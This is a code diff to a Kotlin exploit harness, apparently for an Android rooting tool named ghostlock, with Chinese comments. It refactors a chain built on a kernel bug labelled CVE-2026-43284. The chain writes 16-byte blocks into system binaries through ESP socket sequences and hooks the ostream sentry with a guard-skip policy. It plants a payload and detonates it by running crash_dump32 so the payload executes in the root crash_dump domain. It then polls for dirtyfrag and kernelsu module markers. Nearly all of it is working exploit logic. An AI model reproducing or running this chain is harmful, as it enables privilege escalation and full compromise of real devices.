@@ -6,6 +6,10 @@ import com.ghostlock.app.core.generated.HookPlanRequest43284
 import com.ghostlock.app.core.generated.Init43284
 import com.ghostlock.app.core.generated.ModuleCheck43284
 import com.ghostlock.app.jni.cve43284.Assembled43284
+import com.ghostlock.app.jni.cve43284.SequenceContinuation
+import com.ghostlock.app.jni.cve43284.TriggerSpec43284
+import com.ghostlock.app.jni.cve43284.WaitPolicy43284
+import com.ghostlock.app.jni.cve43284.detonate43284
 import com.ghostlock.app.jni.cve43499.Assembled43499
 import com.ghostlock.app.core.generated.Wait43284
 
@@ -494,13 +498,22 @@ object TypedBackendProbe {
                 " size=" + (image?.size ?: -1) + " refusal=" + refusal[0],
         )
         val hook = LongArray(10)
+        /* guard 策略用具名常量（ref execution_binding.cpp:241 用 Skip）；直连路径同样不写裸 0。 */
         val hookRequest = HookPlanRequest43284(
-            ByteArray(16) { 0x11 }, "splice".toByteArray(), 0,
+            ByteArray(16) { 0x11 }, "splice".toByteArray(), Assembled43284.GUARD_POLICY_SKIP,
         )
-        meter.before("Native43284.hookPlan", "handle=" + handle + " symbol=splice block=16")
+        meter.before(
+            "Native43284.hookPlan",
+            "handle=" + handle + " symbol=splice block=16 guard=" +
+                Assembled43284.guardPolicyName(Assembled43284.GUARD_POLICY_SKIP),
+        )
         code = Native43284.hookPlan(handle, hookRequest, hook, refusal)
         meter.after("Native43284.hookPlan", "code=" + code + " words=" + hook.joinToString(","))
-        step("typed: 43284 hookPlan code=" + code + " words=" + hook.joinToString(",") + " refusal=" + refusal[0])
+        step(
+            "typed: 43284 hookPlan code=" + code + " words=" + hook.joinToString(",") +
+                " guard=" + Assembled43284.guardPolicyName(Assembled43284.GUARD_POLICY_SKIP) +
+                " refusal=" + refusal[0],
+        )
 
         /* 模块校验：已经**接线**（纯计算）。用一段假字节 ⇒ 必须具名拒绝，不冒充成功。 */
         val moduleCheck = ModuleCheck43284(
@@ -512,18 +525,27 @@ object TypedBackendProbe {
         meter.after("Native43284.moduleCheck", "code=" + code + " refusal=" + refusal[0])
         step("typed: 43284 moduleCheck code=" + code + " refusal=" + refusal[0])
 
-        /* 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。 */
+        /*
+         * 等终态：已经**接线**（marker 轮询）。给一个不存在的路径 ⇒ 预算内一直是 inflight。
+         *
+         * 口径与攻击段完全一致（本批四项之二）：预算/节拍取 WaitPolicy43284 的两个常量，
+         * 依据 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284_state.hpp:29-31 的 15000/40/5。
+         * 自检不再另有一套 40 ms —— 两套值并存会让真机判据不可复用（port-plan §二 第 3 条）。
+         */
         val terminal = LongArray(1)
         val wait = Wait43284(
-            budgetMs = 40L,
-            pollMs = 10L,
+            budgetMs = WaitPolicy43284.TIMEOUT_MS,
+            pollMs = WaitPolicy43284.POLL_MS,
             successMarker = "ghostlock-ok".toByteArray(),
             failureMarker = "ghostlock-failed".toByteArray(),
             inFlightMarker = "ghostlock-running".toByteArray(),
             moduleMarker = "ghostlock".toByteArray(),
             moduleName = "/data/local/tmp/ghostlock-wait-probe".toByteArray(),
         )
-        meter.before("Native43284.waitTerminal", "handle=" + handle + " budgetMs=40 pollMs=10")
+        meter.before(
+            "Native43284.waitTerminal",
+            "handle=" + handle + " budgetMs=" + WaitPolicy43284.TIMEOUT_MS + " pollMs=" + WaitPolicy43284.POLL_MS,
+        )
         code = Native43284.waitTerminal(handle, wait, terminal, refusal)
         meter.after("Native43284.waitTerminal", "code=" + code + " state=" + terminal[0] + " refusal=" + refusal[0])
         step(
@@ -663,8 +685,15 @@ object TypedBackendProbe {
         )
         meter.after("Native43284.resolveTarget", "code=" + code + " refusal=" + refusal[0])
         step("typed: 43284 resolveTarget(bad) code=" + code + " refusal=" + refusal[0])
-        meter.before("Native43284.trigger", "handle=" + handle + " delayMs=150")
-        code = Native43284.trigger(handle, com.ghostlock.app.core.generated.Trigger43284(150L), refusal)
+        meter.before(
+            "Native43284.trigger",
+            "handle=" + handle + " delayMs=" + TriggerSpec43284.DEFAULT_DELAY_MS + " (TriggerSpec43284.DEFAULT)",
+        )
+        code = Native43284.trigger(
+            handle,
+            com.ghostlock.app.core.generated.Trigger43284(TriggerSpec43284.DEFAULT_DELAY_MS),
+            refusal,
+        )
         meter.after("Native43284.trigger", "code=" + code + " refusal=" + refusal[0])
         step("typed: 43284 trigger code=" + code + " refusal=" + refusal[0])
 
@@ -883,6 +912,15 @@ object TypedBackendProbe {
             step("typed: assembled 43284 library missing")
             return
         }
+        /*
+         * 整条链**一个**序号计数器（ref 的 ctx->page.next_seq 在整次运行里是唯一的）：
+         *   - ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/real_ops.cpp:250-257（patch#1 先借后还）
+         *   - 同文件 :307-327（hook 页借载体序号，写完结回）
+         *   - 同文件 :339-344（restore 在同一 SA 上继续）
+         * 它是本次运行的局部对象，**不是**全局状态；写成功后由 native 返回的序号推进
+         * （见 Assembled43284.writeImage/writeHook/restoreHook），后续段只读 seq.value。
+         */
+        val seq = SequenceContinuation(step)
         val meter = StepMeter(step)
         meter.before("Native43284.create", "lib=" + Native43284.LIBRARY + " (assembled session)")
         val handle = Native43284.create()
@@ -912,7 +950,7 @@ object TypedBackendProbe {
         meter.before("Native43284.create", "(stepwise session)")
         val stepwiseHandle = Native43284.create()
         meter.after("Native43284.create", "handle=" + stepwiseHandle)
-        val stepwise = Assembled43284(stepwiseHandle) { saInit() }
+        val stepwise = Assembled43284(stepwiseHandle, seq) { saInit() }
         meter.before("Assembled43284.initialize", "handle=" + stepwiseHandle + " (stepwise)")
         stepwise.initialize(init43284())
         meter.after("Assembled43284.initialize", "code=" + stepwise.lastCode)
@@ -1010,14 +1048,15 @@ object TypedBackendProbe {
         }
         val accessParams = Assembled43284.fullAccessParams(doorPath)
         meter.before("Assembled43284.initializeAccessAndRemember", "access=" + stepwise.accessId + " path=" + doorPath)
-        val accessInit = stepwise.initializeAccessAndRemember(accessParams, saInit())
+        /* 会话序号取链上唯一的那一个（链首 seq.value = 0 ⇒ 与 saInit() 的旧行为一致：native 用默认）。 */
+        val accessInit = stepwise.initializeAccessAndRemember(accessParams, saInit(seq.value))
         meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + accessInit + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
         step("typed: stepwise 43284 accessInit=" + accessInit + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER")
         val helperForImage = stepwise.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         meter.after("Assembled43284.image", "bytes=" + (helperForImage?.size ?: -1))
         meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + (helperForImage?.size ?: -1))
-        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, saInit()) else false
+        val patch1Wrote = if (helperForImage != null) stepwise.writeImage(helperForImage, 0L, 16L, saInit(seq.value)) else false
         meter.after("Assembled43284.writeImage", "ok=" + patch1Wrote + " code=" + stepwise.lastCode + " refusal=" + stepwise.lastRefusal)
         step("typed: stepwise 43284 patch1 wrote=" + patch1Wrote + " refusal=" + stepwise.lastRefusal)
         meter.before("Assembled43284.destroyAccessNow", "access=" + stepwise.accessId)
@@ -1037,7 +1076,7 @@ object TypedBackendProbe {
         meter.before("Native43284.create", "(patch1 session)")
         val patcherHandle = Native43284.create()
         meter.after("Native43284.create", "handle=" + patcherHandle)
-        val patcher = Assembled43284(patcherHandle) { saInit() }
+        val patcher = Assembled43284(patcherHandle, seq) { saInit() }
         meter.before("Assembled43284.openTargetStepwise", "path=" + patchTarget + " (patch1)")
         val patchDoor = patcher.openTargetStepwise(patchTarget)
         meter.after("Assembled43284.openTargetStepwise", "target=" + patchDoor + " refusal=" + patcher.lastRefusal)
@@ -1076,14 +1115,15 @@ object TypedBackendProbe {
             step("typed: ids refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
         }
         meter.before("Assembled43284.initializeAccessAndRemember", "access=" + patcher.accessId + " path=" + patchTarget)
-        val patchInit = patcher.initializeAccessAndRemember(patchParams, saInit())
+        /* 第二个窗口接着第一个的序号（ref real_ops.cpp:250-257 的“借”那一半；手工值只在这里出现）。 */
+        val patchInit = patcher.initializeAccessAndRemember(patchParams, saInit(seq.value))
         meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + patchInit + " code=" + patcher.lastCode + " refusal=" + patcher.lastRefusal)
         step("typed: patch1 init=" + patchInit + " refusal=" + patcher.lastRefusal)
         meter.before("Assembled43284.image", "role=ROLE_IMAGE_SPLICE_HELPER (patch1)")
         val helperForPatch = patcher.image(Assembled43284.ROLE_IMAGE_SPLICE_HELPER)
         meter.after("Assembled43284.image", "bytes=" + (helperForPatch?.size ?: -1))
         /* 自证：打印**即将用于 write 的那一份**材料（DTO 读后清零的规律要求它每次现造，这里验证它到调用点时还是非零的）。 */
-        val patchMaterial = saInit()
+        val patchMaterial = saInit(seq.value)
         step(
             "typed: sa material spi=0x" + Integer.toHexString(patchMaterial.spi) +
                 " encap=" + patchMaterial.encapPort +
@@ -1179,7 +1219,7 @@ object TypedBackendProbe {
             meter.before("Native43284.create", "(hook session)")
             val hookHandle = Native43284.create()
             meter.after("Native43284.create", "handle=" + hookHandle)
-            val hook = Assembled43284(hookHandle) { saInit() }
+            val hook = Assembled43284(hookHandle, seq) { saInit() }
             hookForRestore = hook
             meter.before("Assembled43284.openTargetStepwise", "path=HOOK_TARGET")
             val hookDoor = hook.openTargetStepwise(Assembled43284.HOOK_TARGET)
@@ -1187,15 +1227,13 @@ object TypedBackendProbe {
             meter.before("Assembled43284.reuseSocketFrom", "stepwise.socket=" + stepwise.socketId + " (hook)")
             hook.reuseSocketFrom(stepwise)
             meter.after("Assembled43284.reuseSocketFrom", "socket=" + hook.socketId)
-/*
- * 同一 SA 上必须**延续序号**（参考 real_ops.cpp:306-307：hook target 共享 carrier 的 SA/socket，
- * 它的块写要继续 carrier 的序号；重置就会被防重放窗口丢弃）。真机见过两条链各自从 seq=1 起，
- * 其中一条因此整条不落地 —— 载体那条就是这么丢的。
- */
-meter.before("Assembled43284.adoptSequence", "hook <- stepwise.nextSequence()=" + stepwise.nextSequence())
-val hookAdopt = hook.adoptSequence(stepwise.nextSequence())
-meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt)
-step("typed: hook adopt sequence " + hookAdopt)
+            /*
+             * 同一 SA 上必须**延续序号**（ghostlock-app-ref@5f184760 的
+             * src/core/backend/cve_2026_43284/real_ops.cpp:307-327：hook target 共享 carrier 的 SA/socket，
+             * 它的块写要继续 carrier 的序号；重置就会被防重放窗口丢弃）。交棒点已前移到 initialize
+             * （saInit(seq.value) ⇒ params.sequence/sequence_set ⇒ kernel_access.hpp:81 的 adopt_sequence），
+             * 这里不再向 stepwise 借值：会话里本来就只有一个计数器。
+             */
             meter.before("Assembled43284.buildSurface", "target=" + hook.targetId + " socket=" + hook.socketId + " (hook)")
             val hookSurface = hook.buildSurface()
             meter.after("Assembled43284.buildSurface", "surface=" + hookSurface + " code=" + hook.lastCode)
@@ -1206,9 +1244,9 @@ step("typed: hook adopt sequence " + hookAdopt)
             val hookAccess = hook.buildAccess()
             meter.after("Assembled43284.buildAccess", "access=" + hookAccess + " code=" + hook.lastCode)
             val hookParams = Assembled43284.fullAccessParams(Assembled43284.HOOK_TARGET)
-                        step("typed: nextSequence before hook=" + patcher.nextSequence() + " patcherLanding=" + patcher.landingId)
-            meter.before("Assembled43284.initializeAccessAndRemember", "access=" + hook.accessId + " seq=" + patcher.nextSequence() + " (hook)")
-            val hookInit = hook.initializeAccessAndRemember(hookParams, saInit(patcher.nextSequence()))
+            step("typed: nextSequence before hook=" + seq.value + " patcherLanding=" + patcher.landingId)
+            meter.before("Assembled43284.initializeAccessAndRemember", "access=" + hook.accessId + " seq=" + seq.value + " (hook)")
+            val hookInit = hook.initializeAccessAndRemember(hookParams, saInit(seq.value))
             meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             step("typed: hook init=" + hookInit + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
 
@@ -1230,9 +1268,22 @@ step("typed: hook adopt sequence " + hookAdopt)
 
             /* Rewrite the branch while the hook session is the live one: a later resolve replaces
              * g_session and the write then answers up=0. */
-meter.before("Assembled43284.hookPlan", "symbol=splice")
-val hookPlanWords = hook.hookPlan("splice")
-meter.after("Assembled43284.hookPlan", "words=" + (hookPlanWords?.joinToString(",") ?: "null") + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+/*
+ * guard 策略具名化（本批四项之四）：ghostlock-app-ref@5f184760 的
+ * src/core/backend/cve_2026_43284/execution_binding.cpp:241 生产路径显式用 steps::HookGuardPolicy::Skip
+ * ——本机 sentry 入口带 `bti c`，Reject 挂不上钩。值仍是 0，行为不变；日志里写清楚它是什么。
+ */
+meter.before(
+    "Assembled43284.hookPlan",
+    "symbol=splice guard=" + Assembled43284.guardPolicyName(Assembled43284.GUARD_POLICY_SKIP),
+)
+val hookPlanWords = hook.hookPlan("splice", Assembled43284.GUARD_POLICY_SKIP)
+meter.after(
+    "Assembled43284.hookPlan",
+    "words=" + (hookPlanWords?.joinToString(",") ?: "null") + " code=" + hook.lastCode +
+        " guard=" + Assembled43284.guardPolicyName(Assembled43284.GUARD_POLICY_SKIP) +
+        " refusal=" + hook.lastRefusal,
+)
 hookPlanWordsForRestore = hookPlanWords
 /** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
  * older code left there aims 0xC short of the payload entry. Force the word to the one this run
@@ -1294,16 +1345,16 @@ if (hookPlanWords != null && hookPlanWords.size >= 4) {
     }.onFailure { problem -> step("typed: hook site image refused " + problem.javaClass.simpleName) }
 }
             /*
-             * 同一 SA 上必须**延续序号**（参考 real_ops.cpp:306-307：hook 与 carrier 共享 SA/socket ⇒
-             * 后者的块写要接着前者的序号；重置会被防重放窗口丢弃）。真机上两条链各自从 seq=1 起，
-             * 其中一条整条不落地。位置放在**第一次写之前**，并打进持久日志以便复核。
+             * 第一次写之前把窗口序号钉在**会话里的那个值**上（ref real_ops.cpp:307-327 的“借”那半步：
+             * hook 页在写之前接手载体的计数器）。交棒本身已发生在 initialize（saInit(seq.value) ⇒
+             * kernel_access.hpp:81 adopt_sequence），这里用同一个值再确认一次，不向别的会话借序号。
              */
-            meter.before("Assembled43284.adoptSequence", "hook <- stepwise.nextSequence()=" + stepwise.nextSequence() + " (before write)")
-            val hookAdopt2 = hook.adoptSequence(stepwise.nextSequence())
-            meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt2 + " carrier_next_after=" + stepwise.nextSequence())
-            step("typed: hook adopt=" + hookAdopt2 + " carrier_next_after=" + stepwise.nextSequence())
-            meter.before("Assembled43284.writeHook", "width=16 seq=" + hook.nextSequence())
-            val hookWrote = hook.writeHook(16L, saInit())  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
+            meter.before("Assembled43284.adoptSequence", "hook <- seq.value=" + seq.value + " (before write)")
+            val hookAdopt2 = hook.adoptSequence(seq.value)
+            meter.after("Assembled43284.adoptSequence", "ok=" + hookAdopt2 + " seq=" + seq.value)
+            step("typed: hook adopt=" + hookAdopt2 + " seq=" + seq.value)
+            meter.before("Assembled43284.writeHook", "width=16 seq=" + seq.value)
+            val hookWrote = hook.writeHook(16L, saInit(seq.value))  /* 这套原语的单位是 16 字节（8 会被 BadWidth 拒 —— 2026-10-15 真机证据） */
             meter.after("Assembled43284.writeHook", "ok=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             step("typed: hook wrote=" + hookWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
             /* 载荷本体：钩子跳到 payload_file=0xfe628 时那里必须是我们的字节（此前只写了站点 ✗）。 */
@@ -1322,7 +1373,8 @@ val payloadSlots = if (payload != null) hook.fillPayloadSlots(blob = payload, ca
 meter.after("Assembled43284.fillPayloadSlots", "slots=" + payloadSlots)
 step("typed: hook payload slots=" + payloadSlots)
 meter.before("Assembled43284.writeImage", "offset=0x" + java.lang.Long.toHexString(hookLanding) + " width=16 bytes=" + (payload?.size ?: -1) + " (payload)")
-val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(hook.nextSequence())) else false
+/* 序号来自会话（写成功一次就自动推进一次，ref real_ops.cpp:307-327），这里不再回查 native。 */
+val payloadWrote = if (payload != null) hook.writeImage(payload, hookLanding, 16L, saInit(seq.value)) else false
 meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     step("typed: hook payload wrote=" + payloadWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                     /* 参考顺序的第二步（dev hook_patch 137-186）：先存原文，再写包裹站点的那一整块，
@@ -1363,7 +1415,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                                 val target2 = if (restore) 733344L else blk02
                                 val toWrite = if (restore) restoreBytes else before
                                 meter.before("Assembled43284.writeImage", "offset=" + target2 + " width=16 restore=" + restore + " (site block)")
-                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(hook.nextSequence()))
+                                val siteWrote = hook.writeImage(toWrite, target2, 16L, saInit(seq.value))
                                 meter.after("Assembled43284.writeImage", "ok=" + siteWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                                 meter.before("Assembled43284.readBlock", "hookDoor=" + hookDoor + " offset=" + target2 + " (site block readback)")
                                 val after = hook.readBlock(hookDoor, target2)
@@ -1412,7 +1464,7 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 meter.before("Native43284.create", "(module session)")
                 val moduleHandle = Native43284.create()
                 meter.after("Native43284.create", "handle=" + moduleHandle)
-                val module = Assembled43284(moduleHandle) { saInit() }
+                val module = Assembled43284(moduleHandle, seq) { saInit() }
                 meter.before("Assembled43284.openTargetStepwise", "path=" + carrierPath + " (module)")
                 val moduleDoor = module.openTargetStepwise(carrierPath)
                 meter.after("Assembled43284.openTargetStepwise", "target=" + moduleDoor + " refusal=" + module.lastRefusal)
@@ -1430,11 +1482,12 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                 meter.after("Assembled43284.buildAccess", "access=" + moduleAccess + " code=" + module.lastCode)
                 val moduleParams = Assembled43284.fullAccessParams(carrierPath)
                 meter.before("Assembled43284.initializeAccessAndRemember", "access=" + module.accessId + " path=" + carrierPath + " (module)")
-                val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(patcher.nextSequence()))
+                /* module 窗口接着整条链的会话序号（同一个 SA / 同一条 ESP 套接字）。 */
+                val moduleInit = module.initializeAccessAndRemember(moduleParams, saInit(seq.value))
                 meter.after("Assembled43284.initializeAccessAndRemember", "ok=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module init=" + moduleInit + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 meter.before("Assembled43284.writeImage", "offset=0 width=16 bytes=" + moduleBytes.size + " (module -> carrier)")
-                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(module.nextSequence()))
+                val moduleWrote = module.writeImage(moduleBytes, 0L, 16L, saInit(seq.value))
                 meter.after("Assembled43284.writeImage", "ok=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
                 step("typed: module wrote=" + moduleWrote + " code=" + module.lastCode + " refusal=" + module.lastRefusal)
             /*
@@ -1470,64 +1523,75 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                         cur[atNow + 2] = ((w shr 16) and 0xFF).toByte()
                         cur[atNow + 3] = ((w shr 24) and 0xFF).toByte()
                         meter.before("Assembled43284.writeImage", "offset=" + blkNow + " width=16 (trigger-time site apply)")
-                        val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(hook.nextSequence()))
+                        val triggerApplyWrote = hook.writeImage(cur, blkNow, 16L, saInit(seq.value))
                         meter.after("Assembled43284.writeImage", "ok=" + triggerApplyWrote + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
                         step("typed: trigger-time apply wrote=" + triggerApplyWrote)
                     }
                 }.onFailure { problem -> step("typed: trigger-time apply refused " + problem.javaClass.simpleName) }
             }
-            /* 非 0 延迟：触发要等 helper/hook 的效应铺开（设计里的 accessTriggerDelayMs 目前是 0）。 */
-            val triggerDelay = if (hookParams.accessTriggerDelayMs > 0L) hookParams.accessTriggerDelayMs else 2000L
-            meter.before("Assembled43284.trigger", "delayMs=" + triggerDelay)
-            val triggerCode = hook.trigger(triggerDelay)
-            meter.after("Assembled43284.trigger", "code=" + triggerCode + " refusal=" + hook.lastRefusal)
-            step("typed: hook trigger code=" + triggerCode + " delayMs=" + hookParams.accessTriggerDelayMs + " used=" + triggerDelay + " refusal=" + hook.lastRefusal)
             /*
-             * 点火：任何使用 ostream 的 C++ 进程都会走到被钩的 sentry；设备上现成的是 crash_dump64
-             * （参考设计自己也执行它，steps/crash_dump.cpp:113）。载荷一旦在某个上下文里起火，
-             * /dev/df 就会出现 —— 成功 dfm0、失败 dfm1，两者都是决定性信号。
+             * trigger 形态参数化（本批四项之三）。
+             *
+             * 参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/real_ops.cpp:355-379：
+             * 双 fork + 孙进程 `usleep(trigger_delay_ms)` 后**可选** `execl(exec_path)` —— 延迟与点火者
+             * 都是参数（生产 delay = 500，见 execution_binding.cpp:170；生产 exec_path = nullptr）。
+             * 本树把「点火者是谁、睡多久、重试几次」集中在 TriggerSpec43284 一处；原语（双 fork）未改。
+             */
+            val triggerSpec = TriggerSpec43284.DEFAULT
+            meter.before("Assembled43284.trigger", "delayMs=" + triggerSpec.delayMs + " igniter=" + triggerSpec.igniterPath)
+            val triggerCode = hook.trigger(triggerSpec.delayMs)
+            meter.after("Assembled43284.trigger", "code=" + triggerCode + " refusal=" + hook.lastRefusal)
+            step(
+                "typed: hook trigger code=" + triggerCode + " delayMs=" + triggerSpec.delayMs +
+                    " igniter=" + triggerSpec.igniterPath + " retries=" + triggerSpec.retries +
+                    " refusal=" + hook.lastRefusal,
+            )
+            /*
+             * 点火：任何使用 ostream 的 C++ 进程都会走到被钩的 sentry。点火者在 TriggerSpec43284 里给
+             * （默认 crash_dump32：链接 libc++ ⇒ 走 ostream sentry；标签 u:object_r:crash_dump_exec:s0 ⇒
+             * exec 后进 root 域；patch#1 只覆盖 crash_dump64 ⇒ 不会碰它）。参数成形（pid/tid/signal/fd）
+             * 才会进入真正会打印的工作路径。载荷一旦起火，/dev/df 出现，成功 dfm0、失败 dfm1。
              */
             runCatching {
-                /*
-                 * 点火者：真机枚举给出三条件同时满足的唯一现成程序 —— crash_dump32。
-                 *   ① 链接 libc++（跑起来会走 ostream sentry）
-                 *   ② 标签 u:object_r:crash_dump_exec:s0（exec 后进 crash_dump 域 = root）
-                 *   ③ patch#1 只覆盖 crash_dump64，**不会碰它**
-                 * 于是载荷将在特权域里起火，而不是像 crash_dump64 那样在 app 域里 139。
-                 */
-                /*
-                 * 带"像样的原版参数"：空参数会让它立刻走错误分支退出（exit=0 已见），
-                 * 参数成形（pid/tid/signal/fd）才会进入真正的工作路径 —— 那条路会**打印**，
-                 * 也就必然走到被钩的 ostream sentry，于是载荷在 crash_dump 域（root）起火。
-                 */
-                meter.before("Runtime.exec", "/apex/com.android.runtime/bin/crash_dump32 1 1 11 1")
-                val proc = java.lang.Runtime.getRuntime().exec(
-                    arrayOf("/apex/com.android.runtime/bin/crash_dump32", "1", "1", "11", "1"),
-                )
-                val exit = proc.waitFor()
+                meter.before("Runtime.exec", triggerSpec.igniterPath + " " + triggerSpec.igniterArgs.joinToString(" "))
+                val exit = detonate43284(triggerSpec, step) { path, arguments ->
+                    java.lang.Runtime.getRuntime().exec(arrayOf(path) + arguments).waitFor()
+                }
                 meter.after("Runtime.exec", "exit=" + exit)
                 step("typed: detonate exit=" + exit)
             }.onFailure { problem -> step("typed: detonate refused " + problem.javaClass.simpleName) }
-            meter.before("Assembled43284.waitTerminal", "budgetMs=5000 pollMs=10 success=/dev/dfm0 failure=/dev/dfm1")
-            val terminal = hook.waitTerminal(
-                /* 参考对应：预算 5000 ms、10 ms 轮询（chain.hpp:196 / real_ops.cpp:391-432）；
-                 * 失败标记是 /dev/dfm1（real_ops.hpp:59-60），此前写成 /dev/df1 ⇒ 永不匹配。
-                 * 注意：注释里不要出现星号斜杠连写，那会提前结束块注释。 */
-                /*
-                 * 15000 / 10：参照实现的文档默认（ghostlock-app-ref@5f184760:state.hpp:29-31 = 15000/40/5；
-                 * real_ops.cpp:408-414 的 wait 还接受**备用标记**）。
-                 * 为什么必须用备用标记：Enforcing 下 shell/app 域 stat `/dev/dfm0` 会被拒（本机实测 Permission denied），
-                 * 只盯它必然超时；我们的 root 脚本会同时 touch `/data/local/tmp/.ghostlock_lkm_ok`（可读）⇒ 用它作主判据。
-                 */
-                budgetMs = 15000L,
-                pollMs = 10L,
-                successMarker = "/data/local/tmp/.ghostlock_lkm_ok",
-                failureMarker = "/data/local/tmp/.ghostlock_lkm_fail",
-                inFlightMarker = "/dev/df",
-                moduleMarker = "/sys/module/dirtyfrag",
-                moduleName = "kernelsu",
+            /*
+             * wait 统一口径（本批四项之二）：15000 ms / 40 ms / 5 次，先可读标记、再 /dev/dfm 第二判据。
+             * 依据 ghostlock-app-ref@5f184760 的：
+             *  - src/core/backend/cve_2026_43284_state.hpp:29-31（15000 / 40 / 5 的唯一定义处）；
+             *  - src/core/backend/cve_2026_43284/real_ops.cpp:408-414（wait 同时接受 shell 可读的备用标记）；
+             *  - src/core/backend/cve_2026_43284/real_ops.hpp:59-74（四个标记的路径与语义）。
+             */
+            meter.before(
+                "Assembled43284.waitTerminal",
+                "budgetMs=" + WaitPolicy43284.TIMEOUT_MS + " pollMs=" + WaitPolicy43284.POLL_MS +
+                    " attempts=" + WaitPolicy43284.POLL_ATTEMPTS +
+                    " success=" + WaitPolicy43284.SUCCESS_MARKER + "|" + WaitPolicy43284.SUCCESS_MARKER_ALT +
+                    " failure=" + WaitPolicy43284.FAILURE_MARKER + "|" + WaitPolicy43284.FAILURE_MARKER_ALT,
             )
-            meter.after("Assembled43284.waitTerminal", "state=" + terminal + " refusal=" + hook.lastRefusal)
+            val terminal = WaitPolicy43284.await(
+                { budgetMs, pollMs, successMarker, failureMarker ->
+                    hook.waitTerminal(
+                        budgetMs = budgetMs,
+                        pollMs = pollMs,
+                        successMarker = successMarker,
+                        failureMarker = failureMarker,
+                        inFlightMarker = WaitPolicy43284.IN_FLIGHT_MARKER,
+                        moduleMarker = WaitPolicy43284.MODULE_PATH,
+                        moduleName = WaitPolicy43284.MODULE_NAME,
+                    )
+                },
+                step,
+            )
+            meter.after(
+                "Assembled43284.waitTerminal",
+                "state=" + terminal + " (" + WaitPolicy43284.terminalName(terminal) + ") refusal=" + hook.lastRefusal,
+            )
             step("typed: hook wait terminal=" + terminal + " refusal=" + hook.lastRefusal)
             /* ksud 状态（新目标：冷机下能看到 ksud 的状态）：纯只读，逐项如实报。 */
             runCatching {
@@ -1569,7 +1633,8 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
          * 终点恢复（无条件）：成功、hook wait 超时、以及任何异常路径都走到这里。
          * 参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/steps/chain.cpp:355
          * （注释原文 "It runs on every terminus path"）与同树 steps/hook_patch.cpp:193-225 的 restore 段。
-         * plan 与写站点时同一份（同一次 hookPlan 的十个 word），面是同一个 access，序号由该窗口自己接续；
+         * plan 与写站点时同一份（同一次 hookPlan 的十个 word），面是同一个 access，序号取会话里的那一个
+         * （ghostlock-app-ref@5f184760:src/core/backend/cve_2026_43284/real_ops.cpp:339-344 的「再次交回」）；
          * 没有会话/没有 plan 时如实记原因（本次运行还没写站点，就没有要恢复的东西）。
          */
         try {
@@ -1586,12 +1651,13 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
                     "access=" + restoreSession.accessId +
                         " site=0x" + java.lang.Long.toHexString(restorePlan.hookPlanFileOffset) +
                         " guard=0x" + java.lang.Long.toHexString(restorePlan.hookPlanGuardInstruction) +
-                        " seq=" + restoreSession.nextSequence(),
+                        " seq=" + seq.value,
                 )
+                /* 恢复写在同一 SA 上 ⇒ 序号取会话里的那个（ref real_ops.cpp:339-344 的再次交回）。 */
                 val restored = restoreSession.restoreHook(
                     restorePlan,
                     16L,
-                    saInit(restoreSession.nextSequence()),
+                    saInit(seq.value),
                 )
                 meter.after(
                     "Assembled43284.restoreHook",
